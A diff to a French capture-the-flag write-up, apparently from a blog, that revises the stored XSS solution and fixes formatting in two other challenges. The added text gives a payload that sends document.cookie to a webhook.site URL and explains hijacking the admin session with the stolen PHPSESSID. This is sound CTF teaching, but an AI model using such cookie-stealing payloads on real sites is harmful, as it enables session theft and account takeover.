@@ -371,12 +371,18 @@ J'ai alors testé.
 
 ![vuln](/assets/posts/finalphoenix/vuln.png)
 
-Généralement pour ce genre de défi, le flag est inséré dans le document.cookie que nous devons récupérer. J'ai alors utilisé ce payload `<script>
-  let img = new Image(); 
-  img.src = "mon lien webhook + document.cookie;
-</script>`
+Généralement pour ce genre de défi, le flag est inséré dans le document.cookie que nous devons récupérer. J'ai alors utilisé ce payload  `', '<img src=x onerror="fetch('https://webhook.site/1bda16cc-2cd2-4d62-a50d-b6b1b19ed7c5?c='+document.cookie)">') --` que j'ai encodé en url et j'ai réussi à capturer un cookie PHPSESSID sur mon webhook. 
+
+![webhook](/assets/posts/finalphoenix/webhook.png)
  
- Ensuite le cookie PHPSESSID de l'admin a été envoyé. Vous vous rapelez du `/admin.php` vous allez sur le lien et vous modifiez votre par le nouveau et vous aurez le flag. 
+
+Vous vous rapelez du `/admin.php` je suis allé sur la page et j'ai modifié le cookie par celui que j'ai capturé. Et je me suis connecté en tant qu'admin.  Sur la page d'administration y'a un bouton pour consulter les logs.
+
+![log](/assets/posts/finalphoenix/logs.png)
+
+Une fois sur la page on a le flag. 
+
+![xxs](/assets/posts/finalphoenix/xxsflag.png)
 
  `Flag` : `TPQCTF{stored_xxs_attack_or_weak_cr3ds_4593}`
 
@@ -406,14 +412,14 @@ J'ai commencé par rechercher sms decode comme le nom du défi.
 ![decoder](/assets/posts/finalphoenix/decoder.png) 
 
 
-`Flag`  : `	TPQCTF{SMS_ENCODING_FUNNY_!!!}`
+`Flag`  : `TPQCTF{SMS_ENCODING_FUNNY_!!!}`
 
 
 # Triple menace 
 
 ![triple](/assets/posts/finalphoenix/triple.png) 
 
-``File`` : [encrypt.py](/assets/posts/finalphoenix/encrypt.py), flag_encrypted](/assets/posts/finalphoenix/flag-encrypted.txt) 
+``File`` : [encrypt.py](/assets/posts/finalphoenix/encrypt.py), [flag_encrypted](/assets/posts/finalphoenix/flag-encrypted.txt) 
    
 Commençons par analyser le script de chiffrement: 
 
@@ -519,7 +525,7 @@ print("Flag:", flag.decode())
 L'exécution du script de solution nous donne le flag :
 
 
-```Flag```: ```TPQCTF{Y0u_gu3ss_n0w_tr1pl3_rs4_1snt_tr1pl3_s3cur3}```
+`Flag`: `TPQCTF{Y0u_gu3ss_n0w_tr1pl3_rs4_1snt_tr1pl3_s3cur3}`
 
 
 
